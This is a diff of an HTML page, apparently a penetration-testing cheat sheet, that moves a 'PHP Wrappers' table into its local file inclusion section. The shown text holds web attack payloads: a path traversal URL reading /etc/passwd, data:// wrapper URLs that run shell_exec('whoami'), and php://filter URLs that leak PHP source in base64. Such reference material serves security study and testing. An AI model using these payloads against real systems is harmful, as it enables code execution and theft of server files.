@@ -900,6 +900,31 @@ layout: default
 			<td>http://&lt;url&gt;/department/manage.php?notes=files/UserNotes/../../../../etc/passwd</td>
 		</tr>
 	</table>
+
+	<li>Combine LFI with PHP wrappers</li>
+	<table>
+		<tr>
+			<td>Example 1</td>
+			<td>&lt;url&gt;/menu.php?file=data:text/plain,hello world</td>
+		</tr>
+		<tr>
+			<td>Example 2</td>
+			<td>&lt;url&gt;/menu.php?file=data:text/plain,&lt;?php echo shell_exec(&quot;whoami&quot;) ?&gt;</td>
+		</tr>
+		<tr>
+			<td>LFI - Retrieve php page code in base64</td>
+			<td>
+				<li>&lt;url&gt;/something=php://filter/convert.base64-encode/resource=&lt;php page&gt;</li>
+				<ul>
+					<li>Test index.php first</li>
+				</ul>
+			</td>
+		</tr>
+		<tr>
+			<td>LFI - Retrieve php page by directory</td>
+			<td>&lt;url&gt;/something=php://filter/resource=&lt;php page&gt;</td>
+		</tr>
+	</table>
 	
 	<li>Email poisoning</li>
 	<ul>
@@ -990,35 +1015,6 @@ layout: default
 			</tr>
 		</table>
 	</ul>
-	
-	<hr>
-	
-	<h2>PHP Wrappers</h2>
-	
-	<li>Examples:</li>
-	<table>
-		<tr>
-			<td>Example 1</td>
-			<td>&lt;url&gt;/menu.php?file=data:text/plain,hello world</td>
-		</tr>
-		<tr>
-			<td>Example 2</td>
-			<td>&lt;url&gt;/menu.php?file=data:text/plain,&lt;?php echo shell_exec(&quot;whoami&quot;) ?&gt;</td>
-		</tr>
-		<tr>
-			<td>LFI - Retrieve php page code in base64</td>
-			<td>
-				<li>&lt;url&gt;/something=php://filter/convert.base64-encode/resource=&lt;php page&gt;</li>
-				<ul>
-					<li>Test index.php first</li>
-				</ul>
-			</td>
-		</tr>
-		<tr>
-			<td>LFI - Retrieve php page by directory</td>
-			<td>&lt;url&gt;/something=php://filter/resource=&lt;php page&gt;</td>
-		</tr>
-	</table>
 	
 	<hr>
 	
